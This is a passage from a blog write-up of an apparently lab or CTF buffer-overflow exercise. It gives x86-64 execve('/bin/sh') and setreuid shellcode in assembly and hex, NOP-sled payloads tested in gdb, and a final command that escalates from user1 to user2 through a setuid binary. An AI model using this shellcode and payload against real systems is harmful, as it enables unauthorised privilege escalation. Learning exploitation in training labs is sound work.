<p><em>Side note : I was able to get a shell with these simple shell codes but only by using another method : an env variable. With this method you don't put your shell code in the buffer but in an environment variable and then you give the return address the address of that variable. That way you don't mess up the memory and I didn't get any error.</em></p>
<p>So bellow is a similar simple shell code that i found but it includes an exit call at the end that will prevent the SIGILL errors.</p>
<p>The assembly version:</p>
<pre><code class="language-assembly">    push $0x3b
    pop %eax
    xor %rdx,%rdx
    movabs $0x68732f6e69622f2f,%r8  
    shr $0x8, %r8                   
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall				 &lt;------ from the top to this point it's too execute /bin/sh
    push $0x3c
    pop %eax
    xor %rdi,%rdi
    syscall 			&lt;------ The last 4 lines are for the exit function.
</code></pre>
<p>The hex version:</p>
<pre><code class="language-shell">\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
</code></pre>
<p>This shell code is 40 bytes . I'll cover more about shell codes in the last part of this write up.</p>
<h1>0x3 Finding the address of the shell code</h1>
<p>Our payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.</p>
<p>PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).</p>
<p>There are no specific reason why I put 100 bytes before and 12 bytes after the shell code. You can try different things as long as the total without the return address is 152.</p>
<p>Let's fill the junk with 'A's for now, and our return address with 6*'B'</p>
<pre><code class="language-shell">(gdb) run $(python -c &quot;print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)
</code></pre>
<p>We will now examine the dump of the hex code with the command <code>x/100x $rsp-200</code> which dumps 100*4 bytes from memory location $rsp -200 bytes.</p>
<pre><code class="language-bash">(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x41414141	0x41414141 &lt;--- start of the buffer
0x7fffffffe258:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe268:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe278:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe288:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe298:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe2a8:	0x41414141	0x41414141	0x41414141	0x48583b6a &lt;--- start of the shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
</code></pre>
<p>We see all the 41 that we filled the buffer with. And then we see our shell code.</p>
<p>To calculate the exact address where the shell code starts,  you first  take the memory address on the left on the same line : 0x7fffffffe2a8. This is the address of the first column on this line (filed with 41 at the moment). And then you add 4 bytes per column. Our shell code is 3 columns further so you need to add 3*4= 12 bytes to that address.</p>
<p>In hex 12 is 0xC, you need to do 0x7fffffffe2a + 0xC = 0x7fffffffe2b4</p>
<p>We now got the exact address where the shell code start in the buffer, so we could override the return address with it and it should work.  But sometimes memory shift a bit, from one execution to another the address might change. That's why we use NOPs</p>
<h2>NOPs</h2>
<p>Instead of filling the junk before the shell code with 'A'  we fill it with NOPs (\x90).</p>
<p>The NOPs are instructions to do nothing, they will be skipped. It means that now, you don't need to get the exact address where your shell code start but any address in the NOPS, the program will skip all the NOPS and execute your shell code. That way if the memory shift a bit, your exploit will still work.</p>
<p>Let's replace the 'A's with NOPs and dump our hex again.</p>
<pre><code class="language-bash">(gdb) run $(python -c &quot;print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAABBBBBB

Program received signal SIGSEGV, Segmentation fault.
0x0000424242424242 in ?? ()

(gdb) x/100x $rsp-200
0x7fffffffe228:	0x00400450	0x00000000	0xffffe3e0	0x00007fff
0x7fffffffe238:	0x00400561	0x00000000	0xf7dce8c0	0x00007fff
0x7fffffffe248:	0xffffe64d	0x00007fff	0x90909090	0x90909090 &lt;----- Nops start here
0x7fffffffe258:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe268:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe278:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe288:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe298:	0x90909090	0x90909090	0x90909090	0x90909090 &lt;----- The address I pick
0x7fffffffe2a8:	0x90909090	0x90909090	0x90909090	0x48583b6a &lt;----- shellcode
0x7fffffffe2b8:	0xb849d231	0x69622f2f	0x68732f6e	0x08e8c149
0x7fffffffe2c8:	0x89485041	0x485752e7	0x050fe689	0x48583c6a
0x7fffffffe2d8:	0x050fff31	0x41414141	0x41414141	0x41414141
0x7fffffffe2e8:	0x42424242	0x00004242	0xffffe3e8	0x00007fff
0x7fffffffe2f8:	0x00000000	0x00000002	0x004005a0	0x00000000
0x7fffffffe308:	0xf7a4302a	0x00007fff	0x00000000	0x00000000
0x7fffffffe318:	0xffffe3e8	0x00007fff	0x00040000	0x00000002
</code></pre>
<p>You can now just pick any  address as long as its in the NOPS, I'll pick 0x7fffffffe298.</p>
<p>We need to convert it to little endian:</p>
<p>0x7fffffffe298 becomes 0x98e2ffffff7f and eventually \x98\xe2\xff\xff\xff\x7f</p>
<p>Now let's try to get a shell! We replace the last 6 bytes that were just 6*'B', by this address.</p>
<p>Let's run it outside gdb to be sure we're in the good environment.</p>
<pre><code class="language-bash">$ ./buffer-overflow $(python -c &quot;print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)

Here's a program that echo's out your input
����������������������������������������������������������������������������������������������������j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAA�����
sh-4.2$
</code></pre>
<p>Yeay ! We're in !</p>
<pre><code class="language-bash">sh-4.2$ whoami
user1
sh-4.2$ cat secret.txt
cat: secret.txt: Permission denied
</code></pre>
<p>Aww...As we can see, we're only user1. And we can't access the secret file. Let's look at the permissions.</p>
<pre><code class="language-bash">$ ls -l
total 20
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
</code></pre>
<p>Secret.txt can only be read by user 2, ok we knew that. But the buffer-overflow binary has the the setuid bit (the 's' in the permissions), so I expected that dropping a shell would  give me user2's privileges!  It's not the case and I'll explain why.</p>
<h1>0x4 About Setuid, Setreuid</h1>
<p>There are two main reasons why we're not user2:</p>
<p>First, for security reasons,  the setuid bit is given only when it's necessary. As I understood it, you would have to add in the shell code a function that says &quot;now its necessary to give setuid(UID) to run the next command&quot;.  So I first tried to do just that.</p>
<p>I looked for user's 2 UID</p>
<pre><code class="language-bash">$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
.
.
user1:x:1001:1001::/home/user1:/bin/bash
user2:x:1002:1002::/home/user2:/bin/bash  
user3:x:1003:1003::/home/user3:/bin/bash
</code></pre>
<p>We can see the UID of user2 is 1002. And I looked for a way to add the function <code>setuid(1002)</code> at the top of my shell code and thus become user2 in the shell.</p>
<p>But... that didn't work. Which takes me to the second reason:</p>
<p>When you drop the shell, /bin/sh looks at your <strong>real</strong> UID and not your <strong>effective</strong> UID. You can do research about the difference between real and effective UID but mostly, the funtion setuid(), except if its called on root, only sets your effective UID.  So even if we call setuid(1002), our real UID would still be 1001 and thus we'll remain user1 in the shell.  We need to use another function: <a href="http://man7.org/linux/man-pages/man2/setreuid.2.html">setreuid()</a></p>
<p><em>Side note: Most of the time in these exploits, we want to become root and we target binaries who have the setuid-root bit. In that case, simply doing setuid(0) would work because when called on root, setuid(0) also sets you real UID to root.</em></p>
<p>setreuid() can set both your real and effective uid.  So we need to modify our shell code to execute setreuid(1002,1002) before it executes /bin/sh. And that mean, coding in assembly : Yeeay!</p>
<h1>0x5 Modifying the shell code</h1>
<p>Depending on your knowledge in assembly and in C, there are different ways to approach it:</p>
<ul>
<li>You can write your shellcode in C, compile it, look at the assembly code, remove the bad characters and use it in your exploit.</li>
<li>You can go straight to assembly, find an existing shell code that uses setreuid() and modify it.</li>
<li>The easiest option : you can use <a href="http://docs.pwntools.com/en/stable/">pwntools</a></li>
</ul>
<h2>Manually</h2>
<p>I personally did the 2nd option before i realized pwntools would have been easier. If you're in a hurry go straight to that part bellow.</p>
<p>I grabbed <a href="http://shell-storm.org/shellcode/files/shellcode-77.php">this shell code</a> that setuid(0) , drops a shell and exits. I went to an IRC assembly channel and asked for help to modify it.</p>
<p>First my goal was to setuid(1002), someone helped me to do that. But as I said above, it wasn't enough to become user2. Then I was able to modify it to call setreuid() instead of setuid().  I had to look for the function's %rax number in this <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">Linux System Call Table</a></p>
<p>setreuid()'s rax number is 113 ( 0x71 in hex).  And it takes its two arguments from the rdi and rsi registers.</p>
<p>Here was my assembly code in the end:</p>
<pre><code class="language-assembly">xor    rdi,rdi			&lt;------ set the rdi to 0
xor    rax,rax		
xor    rsi, rsi    		&lt;------ set the rsi to 0
mov    si, 1002  	    &lt;------ put the value 1002 in the lower bits of the rsi
mov    di, 1002			&lt;------ put the value 1002 in the lower bits of the rdi
mov    al,0x71			&lt;------ put the setruid function in the al register      
syscall					&lt;------ call the function.
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall
</code></pre>
<p>And I converted it to hex using <a href="https://defuse.ca/online-x86-assembler.htm">Online Assembly</a> .</p>
<pre><code class="language-shell">\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05
</code></pre>
<p>But if you don't want to bother with trying to understand assembly, there is a much easier way.</p>
<h2>With Pwntools</h2>
<p>You can use <a href="http://docs.pwntools.com/en/stable/">pwntools</a> and its shellcraft module to generate shellcodes for you. We already have a working shell code to get a shell, so we just need to add to it the setreuid() part.</p>
<p>Install pwntools following the instruction on their site. Then run:</p>
<pre><code class="language-bash">┌─[✗]─[l1ge@parrot]─[~]
└──╼$pwn shellcraft -f d amd64.linux.setreuid 1002
</code></pre>
<p><code>-f d</code> sets the format to &quot;escaped&quot;.  You can set <code>-f a</code> to look at the assembly version</p>
<p><em>Side note: It would also work if you don't specify the UID 1002 .  It would automatically grab the effective UID with geteuid() and set it as your Real UID. But I keep it that way to make things clearer.</em></p>
<p>You get you the following shellcode</p>
<pre><code class="language-shell">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
</code></pre>
<p>We just have to paste it in front of our working shell code from section 0x2. The result it:</p>
<pre><code class="language-shell">\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
</code></pre>
<p>It is now longer,  54 bytes in total, so we have to reduce the number of NOPs to keep the offset at 152.</p>
<p>Our final payload looks like this  :</p>
<pre><code class="language-bash">$(python -c &quot;print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)
</code></pre>
<p>Run it</p>
<pre><code class="language-bash">$ ./buffer-overflow $(python -c &quot;print '\x90'*86+'\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'&quot;)

Here's a program that echo's out your input
��������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j&lt;XH1�AAAAAAAAAAAA�����

sh-4.2$ whoami
user2
</code></pre>
<p>You're user2, <code>cat secret.txt</code> and enjoy.</p>
<p>Task 9 works exactly the same way with a different offset.</p>
<p>Good luck ! -l1ge.</p>

      </article>
      

    </div>
  </div>
</div>

  </main>
  <footer class="footer">
  <div class="ax-l-i">
    <nav class="flex items-center justify-center">
      <a class="ml-3 first:ml-0 text-sm text-gray-600 hover:text-gray-800" href="https://l1ge.github.io/posts/">Posts</a>
      <a class="ml-3 first:ml-0 text-sm text-gray-600 hover:text-gray-800" href="https://l1ge.github.io/contact/">Contact</a>
    </nav>
    <div class="footer-social flex items-center justify-center mt-4">
      <a class="block mx-3 w-6 h-6 text-raven-700 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Twitter" href="https://twitter.com/the_l1ge"><svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M32 6.078c-1.2.522-2.458.868-3.78 1.036 1.36-.812 2.398-2.088 2.886-3.626a13.11 13.11 0 0 1-4.16 1.588C25.742 3.794 24.026 3 22.154 3a6.56 6.56 0 0 0-6.556 6.562c0 .52.044 1.02.152 1.496-5.454-.266-10.28-2.88-13.522-6.862-.566.982-.898 2.106-.898 3.316a6.57 6.57 0 0 0 2.914 5.452 6.48 6.48 0 0 1-2.964-.808v.072c0 3.188 2.274 5.836 5.256 6.446-.534.146-1.116.216-1.72.216-.42 0-.844-.024-1.242-.112.85 2.598 3.262 4.508 6.13 4.57a13.18 13.18 0 0 1-8.134 2.798c-.538 0-1.054-.024-1.57-.1C2.906 27.93 6.35 29 10.064 29c12.072 0 18.672-10 18.672-18.668 0-.3-.01-.57-.024-.848C30.014 8.56 31.108 7.406 32 6.078z"/></svg></a>
      <a class="block mx-3 w-6 h-6 text-raven-700 hover:text-raven-900" target="_blank" rel="noopener nofollow" title="Github" href="https://github.com/l1ge"><svg class="fill-current" viewBox="0 0 32 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M15.998 0C7.164 0 0 7.35 0 16.417 0 23.67 4.584 29.82 10.944 31.994c.8.15 1.092-.356 1.092-.79l-.022-2.792c-4.45.99-5.4-2.202-5.4-2.202-.726-1.896-1.776-2.4-1.776-2.4-1.454-1.018.108-.998.108-.998 1.606.117 2.45 1.693 2.45 1.693 1.428 2.507 3.746 1.784 4.658 1.363.144-1.06.558-1.784 1.016-2.195-3.552-.415-7.288-1.823-7.288-8.113 0-1.792.624-3.258 1.648-4.406-.166-.415-.714-2.085.156-4.344 0 0 1.344-.44 4.4 1.683 1.276-.364 2.644-.546 4.006-.552a14.98 14.98 0 0 1 4.006.554C23.062 6.37 24.404 6.8 24.404 6.8c.872 2.26.324 3.93.16 4.344 1.026 1.148 1.644 2.614 1.644 4.406 0 6.306-3.74 7.694-7.304 8.1.574.507 1.086 1.51 1.086 3.04l-.02 4.503c0 .44.288.95 1.1.788C27.42 29.817 32 23.667 32 16.417 32 7.35 24.836 0 15.998 0z"/></svg></a>
    </div>

    <div class="footer-copyright text-sm text-center text-gray-500 mt-4">
      &#169; 2020-2022 l1ge&#39;s cabin
    </div>

    <div class="text-sm sm:text-xs text-center text-gray-500 mt-2">
      Powered by <a href="https://github.com/marketempower/axiom">Axiom</a>
    </div>
  </div>
</footer>

<script src="https://l1ge.github.io/bundle.js?v=1650722515"></script>
<script defer src="https://l1ge.github.io/prism.js?v=1650722515"></script>
</body>
</html>
